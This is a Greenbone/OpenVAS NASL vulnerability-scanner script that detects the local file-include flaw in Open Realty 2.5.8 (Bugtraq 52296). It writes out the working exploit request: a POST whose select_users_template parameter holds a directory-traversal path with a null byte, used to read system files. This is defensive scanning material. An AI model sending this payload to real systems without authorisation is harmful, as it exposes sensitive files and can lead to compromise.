if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103443" );
	script_bugtraq_id( 52296 );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Open Realty 'select_users_template' Parameter Local File Include Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/52296" );
	script_xref( name: "URL", value: "http://www.open-realty.org/" );
	script_xref( name: "URL", value: "http://yehg.net/lab/pr0js/advisories/%5Bopen-realty_2.5.8_2.x%5D_lfi" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-03-06 11:55:55 +0100 (Tue, 06 Mar 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "Open Realty is prone to a local file-include vulnerability because it
  fails to properly sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit this vulnerability to obtain potentially
  sensitive information or to execute arbitrary local scripts in the
  context of the webserver process. This may allow the attacker to
  compromise the application and the computer - other attacks are
  also possible." );
	script_tag( name: "affected", value: "Open Realty version 2.5.8 is vulnerable - other versions may also
  be affected." );
	script_tag( name: "solution", value: "The version 2.5.x version family is no longer maintained by the vendor.
  The version 3.x.x is not found to be vulnerable to this issue. Upgrade to the latest 3.x.x version." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/open-realty", "/openrealty", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/index.php";
	buf = http_get_cache( item: url, port: port );
	if(ContainsString( buf, "meta name=\"Generator\" content=\"Open-Realty\"" ) || IsMatchRegexp( buf, "Powered by.*Open-Realty" )){
		host = http_host_name( port: port );
		files = traversal_files();
		for pattern in keys( files ) {
			file = files[pattern];
			req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: 84\\r\\n", "\\r\\n", "select_users_template=../../../../../../../../../../../../../../../" + file + "%00\\r\\n\\r\\n" );
			res = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
			if(egrep( string: res, pattern: pattern, icase: TRUE )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

